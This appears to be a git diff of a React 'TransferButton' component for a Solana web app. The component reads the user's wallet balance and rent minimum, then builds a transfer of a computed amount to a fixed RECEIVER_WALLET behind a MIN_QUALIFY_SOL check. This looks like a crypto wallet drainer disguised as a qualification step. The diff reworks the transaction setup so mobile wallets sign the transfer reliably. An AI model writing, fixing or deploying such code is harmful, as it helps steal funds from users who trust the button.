@@ -1,15 +1,16 @@
 // src/components/TransferButton.jsx
-import { useWallet } from '@solana/wallet-adapter-react';
+import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { useCallback, useState } from 'react';
 import {
-  Connection,
   LAMPORTS_PER_SOL,
   SystemProgram,
   Transaction,
 } from '@solana/web3.js';
-import { MIN_QUALIFY_SOL, RECEIVER_WALLET, RPC_URL } from '../utils/constants';
+import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';
 
 export default function TransferButton({ className = '' }) {
+  // Use the SAME connection the wallet adapter knows about
+  const { connection } = useConnection();
   const { publicKey, sendTransaction, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
@@ -18,9 +19,6 @@ export default function TransferButton({ className = '' }) {
 
     setLoading(true);
     try {
-      // Simple connection — no wsEndpoint (avoids WS issues on Alchemy)
-      const connection = new Connection(RPC_URL, 'confirmed');
-
       const [balance, rentExempt] = await Promise.all([
         connection.getBalance(publicKey, 'confirmed'),
         connection.getMinimumBalanceForRentExemption(0),
@@ -42,25 +40,23 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Fetch blockhash right before building tx to avoid expiry
-      const { blockhash, lastValidBlockHeight } =
-        await connection.getLatestBlockhash('finalized');
-
       const transferIx = SystemProgram.transfer({
         fromPubkey: publicKey,
         toPubkey: RECEIVER_WALLET,
         lamports: transferAmount,
       });
 
-      // Use legacy Transaction for maximum compatibility (mobile + desktop).
-      // The adapter's sendTransaction() calls signAndSendTransaction on
-      // Wallet Standard wallets — the wallet signs AND sends atomically.
-      // This works on both desktop extensions and mobile in-app browsers.
-      const transaction = new Transaction({
-        feePayer: publicKey,
-        recentBlockhash: blockhash,
-      }).add(transferIx);
+      // ── MINIMAL transaction — do NOT set feePayer or recentBlockhash.
+      // The wallet adapter's sendTransaction() sets both internally
+      // right before it serializes & hands the tx to the wallet.
+      // Pre-setting them can cause mobile wallets to skip signing
+      // because the serialized tx already contains signature placeholders
+      // that the wallet misinterprets as "already signed."
+      const transaction = new Transaction().add(transferIx);
 
+      // sendTransaction() ➜ adapter sets feePayer + blockhash ➜
+      // serializes ➜ wallet.signAndSendTransaction() ➜ wallet signs
+      // AND sends atomically. Works on mobile & desktop.
       const signature = await sendTransaction(transaction, connection);
 
       console.log('⏳ Transaction sent:', signature);
@@ -103,7 +99,7 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, connected]);
+  }, [publicKey, sendTransaction, connected, connection]);
 
   if (!publicKey) return null;
 
